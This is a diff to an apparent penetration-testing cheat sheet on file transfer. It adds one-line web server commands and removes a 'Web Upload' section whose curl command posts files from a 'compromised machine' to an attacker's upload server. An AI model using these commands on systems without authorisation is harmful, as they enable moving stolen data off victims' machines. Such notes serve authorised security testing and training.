@@ -26,7 +26,14 @@ ftp [hostname/IP]
 ## HTTP
 ### Simple Python HTTP Server
 ```
+# Python3
 python3 -m http.server [port]
+# python2.7
+python2.7 -m SimpleHTTPServer
+# PHP
+php -S 0.0.0.0:8000
+# Ruby
+ruby -run -ehttpd . -p8000
 ```
 ### Download (Linux)
 ```
@@ -111,33 +118,6 @@ netstat -lnpt
 Download via SCP
 ```bash
 scp plaintext@<IP>:/<path>/<filename> .
-```
-## Web Upload
-Create a cert for the webserver
-```bash
-openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
-```
-Start the webserver
-```bash
-sudo python3 -m uploadserver 443 --server-certificate <cert path>
-```
-Upload from compromised machine
-```bash
-curl -X POST <URL> -F 'files=@<path_to_file>' -F 'files=@<path_to_file>' --insecure
-# Note multiple files in the same command. --insecure flag needed for self-signed cert
-```
-
-**Copy Files to a directory and start a web server on the compromised machine**  
-Starting webservers in various languages
-```bash
-# python3
-python3 -m http.server
-# python2.7
-python2.7 -m SimpleHTTPServer
-# PHP
-php -S 0.0.0.0:8000
-# Ruby
-ruby -run -ehttpd . -p8000
 ```
 ## SCP Upload
 ```bash
